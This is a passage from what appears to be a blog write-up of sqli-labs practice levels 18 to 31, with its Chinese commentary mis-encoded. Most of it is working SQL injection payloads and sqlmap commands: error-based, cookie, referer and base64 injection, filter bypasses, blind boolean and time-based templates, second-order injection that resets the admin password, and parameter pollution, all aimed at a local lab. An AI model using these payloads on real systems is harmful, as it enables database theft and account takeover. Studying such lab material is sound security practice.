http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump æˆ–è€…å°†æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥\nåŠ ä¸Š*å·\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=4 -D security -T users --dump less19 è¿™æ¬¡æ”¹referer\nsqlmapç›´æ¥æ¢­\n1 2 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; --thread=10 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; -D security -T users --dump æˆ–è€…æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥åœ¨refererååŠ *å·\nless20 ç™»å…¥ç•Œé¢æœ‰æ˜æ˜¾æç¤ºï¼Œcookieæ³¨å…¥\nçŸ¥é“å­—æ®µæ•°å¯ä»¥ç”¨floorå‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥\n1 2 çˆ†ç ´æ•°æ®åº“å Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 çˆ†ç ´è¡¨å Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 çˆ†ç ´å­—æ®µå Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 4 çˆ†ç ´å­—æ®µå†…å®¹ Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select username/password from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# sqlmapè¿›è¡Œcookieæ³¨å…¥ cookieæ³¨å…¥æ—¶ç”¨level=2,åœ¨cookieååŠ *;\n1 2 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 -D security -T users --dump less21 ç™»å…¥è¿›å»å‘ç°cookieè¢«åŠ å¯†äº†\n1 2 admin\u0026#39; and 1=1 order by 4# YWRtaW4nIGFuZCAxPTEgb3JkZXIgYnkgNCM= çœ‹å›æ˜¾é—­åˆæ–¹å¼æ˜¯')\næŠ¥é”™æ³¨å…¥\n1 2 3 4 admin\u0026#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)# base64åŠ å¯† YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdl KSwxKSM= åé¢è·Ÿå‰é¢ä¸€æ ·çˆ†ç ´\nsqlmapè¿›è¡ŒåŠ å¯†æ³¨å…¥ å¯¹è¿›è¡ŒåŠ å¯†æ³¨å…¥çš„æ•°æ®éœ€è¦ç”¨åˆ°tamperæ¨¡å—\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; --current-db 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; -D security -T users --dump less22 é—­åˆæ–¹å¼æ”¹ä¸º\u0026rsquo;\u0026rsquo;,å…¶ä»–è·Ÿless21ä¸€æ ·\nless23 å­—ç¬¦å‹æ³¨å…¥ä½†æ˜¯æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†\n#å’Œ\u0026ndash;+éƒ½è¢«æ›¿æ¢æˆç©ºå­—ç¬¦\nåªæœ‰æƒ³æ–¹æ³•å°†é—­åˆç¬¦å·æ¶ˆè€—å®Œæ¯•ï¼Œè®©åå°èƒ½å¤Ÿæ¥æ”¶ï¼Œå¤„ç†æ‰åŸæœ‰çš„é—­åˆæ–¹å¼\n1 2 3 id=-1\u0026#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 è¿™æ ·æ„é€ é—­åˆçš„ç›®çš„å°±æ˜¯å°†åŸæœ‰å•å¼•å·è¿›è¡Œé€ƒé€¸ä½¿æŸ¥è¯¢è¯­å¥å˜ä¸º id=\u0026#39;-1\u0026#39; xxx and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; æœ€åçš„åŠä¸ª å•å¼•å·ç”¨äºé€ƒé€¸åå°çš„é—­åˆæ–¹å¼ sqlmapè¿ç”¨ 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/sqli-labs/Less-23/?id=1 --batch -D security -T users --dump æ— è„‘æ¢­\nless24 äºŒæ¬¡æ³¨å…¥ äºŒæ¬¡æ³¨å…¥æ˜¯å­˜å‚¨å‹æ³¨å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºæ„é€ æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥\nåˆ°äº†SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œ\nå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ç®€è¨€ä¹‹å°±æ˜¯å°†\nè„æ•°æ®è¿›è¡Œç®€å•è¿‡æ»¤åå¼€å‘è€…å°±è®¤ä¸ºè¯¥æ•°æ®å¯ä¿¡ä¾¿å­˜å…¥æ•°æ®åº“ä¸­ï¼Œå½“ä¸‹ä¸€æ¬¡è°ƒç”¨è¯¥æ•°æ®æ—¶ï¼Œè¯¥æ•°æ®å°±ä¼š\næ‹¼æ¥åˆ°å…¶ä»–æŸ¥è¯¢è¯­å¥ä¸­é€ æˆæ³¨å…¥ã€‚\næ³¨å†Œæ–°è´¦å·ï¼Œå¹¶ç™»å…¥\nä¿®æ”¹å¯†ç ,ä¿®æ”¹åŠŸèƒ½è¯­å¥ä¸º\n1 UPDATE users SET passwd=\u0026#34;New_Pass\u0026#34; WHERE users=\u0026#39;admin\u0026#39; å› ä¸º\u0026rsquo;å’Œåé¢çš„å¼•å·é—­åˆï¼Œè€Œ#åˆæŠŠè¯­å¥æ³¨é‡Šäº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä¿®æ”¹å¯†ç å°±ç›¸å½“äºåœ¨ä¿®æ”¹adminçš„å¯†ç ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±æ˜¯åœ¨è¿›è¡Œè¶Šæƒæ”¹å˜ç®¡ç†å‘˜çš„å¯†ç ï¼Œä»æ•°æ®åº“ä¸­æŠ½å‡ºæˆ‘ä»¬æ³¨å†Œçš„æ–°è´¦æˆ·ï¼Œç”¨è¯¥è´¦æˆ·è¶Šæƒä¿®æ”¹\nç®¡ç†å‘˜çš„å¯†ç \nä¿®æ”¹ä¸º1234\nç™»å…¥adminè´¦å·\nless25 andå’Œoréƒ½è¢«è¿‡æ»¤äº†\nè§£å†³æ€è·¯å°†orå˜æˆoorr,è¿™æ ·åå°è¿‡æ»¤äº†orè¿˜å‰©ä¸‹oræˆ–è€…ç”¨||ä»£æ›¿or(andä¸€æ ·çš„æ–¹å¼)\n1 2 3 4 çˆ†ç ´æ•°æ®åº“å ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ æˆ–è€… ?id=-1\u0026#39; || updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 1 2 3 4 çˆ†ç ´æ•°æ®è¡¨ ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() ),0x7e),1)--+ æ³¨æ„ï¼šinformationä¸­ä¹Ÿæœ‰oréœ€è¦è¿›è¡ŒåŒå†™ åé¢éƒ½ä¸€æ ·\nless25a å‘ç°ä¸Less25çš„åŒºåˆ«æ˜¯æ•°å­—å‹æ³¨å…¥\nè”åˆæ³¨å…¥\n1 2 3 4 5 6 7 8 9 æŸ¥è¯¢æ•°æ®è¡¨ ?id=-1 union select 1,database(),group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() --+ æŸ¥è¯¢å­—æ®µå ?id=-1 union select 1,database(),group_concat(column_name)from infoorrmation_schema.columns where table_name=\u0026#39;users\u0026#39; --+ æŸ¥users id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd))from security.users--+ less26 å‘ç°andï¼Œç©ºæ ¼ï¼Œæ³¨é‡Šéƒ½æ²¡æœ‰äº†\n\\sè¿‡æ»¤äº†ç©ºæ ¼å’Œæ¢è¡Œï¼Œè§£å†³and orå¯ä»¥åŒå†™æˆ–è€…ç”¨\u0026amp;\u0026amp;å’Œ||ä»£æ›¿ï¼Œè§£å†³æ³¨é‡Šéœ€è¦å¼ºè¡Œ\né—­åˆé€ƒé€¸ï¼Œéœ€è¦ç©ºæ ¼çš„åœ°æ–¹å¯ä»¥åŠ ä¸Šæ‹¬å·ï¼Œç™½ç›’æµ‹è¯•å‘ç°æ³¨å…¥ç±»å‹ä¸ºå­—ç¬¦å‹\n1 2 3 and or â€”â€”\u0026gt; \u0026amp;\u0026amp; || # -- â€”â€”\u0026gt; é—­åˆé€ƒé€¸ /s â€”â€”\u0026gt; æ‹¬å· 1 2 3 4 5 6 7 8 9 10 11 12 13 14 payload ?id=-1\u0026#39;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 çˆ†ç ´æ•°æ®è¡¨ ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_sc hema=database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 çˆ†ç ´å­—æ®µå ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_ name=\u0026#39;users\u0026#39;)),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 çˆ†ç ´å­—æ®µå†…å®¹ ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(concat_ws(username,0x3a,passwoorrd)))from(security.users)), 0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 less26a less26aè¿‡æ»¤çš„ä¸œè¥¿ä¸less26ä¸€è‡´ï¼Œé€šè¿‡æµ‹è¯•å‘ç°é—­åˆæ–¹å¼è¿˜æ˜¯ä¸ºå•å¼•å·,å¹¶ä¸”æ²¡æœ‰æŠ¥é”™çš„å›æ˜¾\nå°è¯•ç›²æ³¨\né€šè¿‡å¸ƒå°”ç›²æ³¨å¯ä»¥é€ä¸€çŒœè§£çˆ†ç ´\nç›²æ³¨çš„æ¿å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ç›²æ³¨ ?id=1\u0026#39;and length((select database()))\u0026gt;9--+ #å¤§äºå·å¯ä»¥æ¢æˆå°äºå·æˆ–è€…ç­‰äºå·ï¼Œä¸»è¦æ˜¯åˆ¤æ–­æ•°æ®åº“çš„é•¿åº¦ã€‚lenfth()æ˜¯è·å–å½“å‰æ•°æ®åº“åçš„é•¿åº¦ã€‚å¦‚æœæ•°æ®åº“æ˜¯hahaé‚£ä¹ˆlength()å°±æ˜¯4 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ #substr(\u0026#34;78909\u0026#34;,1,1)=7 substr(a,b,c)aæ˜¯è¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œbæ˜¯æˆªå–çš„ä½ç½®ï¼Œcæ˜¯æˆªå–çš„é•¿åº¦ã€‚å¸ƒå°”ç›²æ³¨æˆ‘ä»¬éƒ½æ˜¯é•¿åº¦ä¸º1å› ä¸ºæˆ‘ä»¬è¦ä¸€ä¸ªä¸ªåˆ¤æ–­å­—ç¬¦ã€‚ascii()æ˜¯å°†æˆªå–çš„å­—ç¬¦è½¬æ¢æˆå¯¹åº”çš„asciiå—ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å¾ˆå¥½ç¡®å®šæ•°å­—æ ¹æ®æ•°å­—æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ã€‚ ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ åˆ¤æ–­æ‰€æœ‰è¡¨åå­—ç¬¦é•¿åº¦ã€‚ ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ é€ä¸€åˆ¤æ–­è¡¨å ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦ ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ é€ä¸€åˆ¤æ–­å­—æ®µåã€‚ ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦ ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ é€ä¸€æ£€æµ‹å†…å®¹ã€‚ æ—¶é—´ç›²æ³¨9 ?id=1\u0026#39; and if(1=1,sleep(5),1)--+ åˆ¤æ–­å‚æ•°æ„é€ ã€‚ ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(5),1)--+ åˆ¤æ–­æ•°æ®åº“åé•¿åº¦ ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+ é€ä¸€åˆ¤æ–­æ•°æ®åº“å­—ç¬¦ ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(5),1)--+ åˆ¤æ–­æ‰€æœ‰è¡¨åé•¿åº¦ ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99,sleep(5),1)--+ é€ä¸€åˆ¤æ–­è¡¨å ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20,sleep(5),1)--+ åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦ ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99,sleep(5),1)--+ é€ä¸€åˆ¤æ–­å­—æ®µåã€‚ ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;109,sleep(5),1)--+ åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦ ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50,sleep(5),1)--+ é€ä¸€æ£€æµ‹å†…å®¹ã€‚ less27 ç›´æ¥çœ‹æºç \nselect,unionè¿™ç±»å…³é”®è¯åªè¿‡æ»¤å®Œå…¨å¤§å†™æˆ–è€…å®Œå…¨å°å†™ï¼Œé’ˆå¯¹phpè¿™ç§å¼±ç±»å‹è¯­è¨€ï¼Œå¯ä»¥é‡‡ç”¨éƒ¨åˆ†å¤§å†™\néƒ¨åˆ†å°å†™ç»•è¿‡\n1 ç©ºæ ¼ï¼Œæ¢è¡Œâ€”â€”\u0026gt; %0a payload\n1 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 1 2 çˆ†ç ´æ•°æ®è¡¨ ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a1,1),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 é‡å†™ç»•è¿‡\n1 2 3 4 5 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1))or\u0026#39;0 çˆ†è¡¨ ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=\u0026#39;security\u0026#39;and(table_name=\u0026#39;users\u0026#39;)))),1))or\u0026#39;0 çˆ†å­—æ®µ ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or\u0026#39;0 çˆ†å¯†ç è´¦æˆ· less27a é—­åˆæ–¹å¼æ”¹ä¸º\u0026quot;,å…¶ä»–å’Œless27ä¸€æ ·\nless28 æŸ¥çœ‹æºç \nunion selectè¢«åŒ¹é…äº†ï¼Œè§£å†³çš„åŠæ³•å°±æ˜¯ç»•è¿‡union select å³å¯ï¼Œæµ‹è¯•å‘ç°æ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼Œé—­åˆæ–¹å¼ä¸º')\nç›²æ³¨\npayload(xæ˜¯è¦çŒœçš„å€¼)\n1 ?id=1\u0026#39;)and(length(database()))=x%0aand(\u0026#39;1\u0026#39;)=(\u0026#39;1 less28a é€šè¿‡æºç å‘ç°ä»…ä»…åŒ¹é…äº†union selectç»„åˆï¼Œå…¶ä½™éƒ½æœªåŒ¹é…ï¼Œä¸Less28ä¸€æ ·ï¼Œç”¨ç›²æ³¨çš„æ–¹å¼\npayload\n1 ?id=1\u0026#39;) and length(database())=8--+ less29 HTTPå‚æ•°æ±¡æŸ“\n1 2 3 4 æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯tomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯apacheä¸ºå¼•æ“çš„phpæœåŠ¡ å™¨ï¼ŒçœŸæ­£æä¾›webæœåŠ¡çš„æ˜¯phpæœåŠ¡å™¨ï¼Œå¾€å¾€åœ¨tomcatçš„æœåŠ¡å™¨å¤„åšè¿‡æ»¤å¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwafï¼Œç”±äº è§£æå‚æ•°çš„æœºåˆ¶ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥åŸç†ç»•è¿‡wafçš„æ£€æµ‹ï¼›æ•°æ®è§£æçš„é¡ºåºï¼štomcatä»å‰å¾€åï¼Œ apacheä»åå¾€å‰ã€‚ æ­¤å…³çš„é€šå…³ç®€å•è”åˆæŸ¥è¯¢å³å¯ï¼Œç›®çš„æ˜¯äº†è§£å‚æ•°æ±¡æŸ“çš„åŸç†\npayload\n1 2 ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;)--+ ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select concat_ws(username,0x7e,password)from security.users limit 0,1)--+ less30 ä¸Less29çš„åŒºåˆ«ä¸ºé—­åˆæ–¹å¼ä¸ºåŒå¼•å·\nless31 ä¸Less29çš„åŒºåˆ«ä¸ºé—­åˆæ–¹å¼ä¸ºåŒå¼•å·åŠ æ‹¬å·\nless32 ","date":"2024-09-07T00:00:00Z","image":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.png","permalink":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","title":"sqli-labsé¶åœºç»ƒä¹ "}]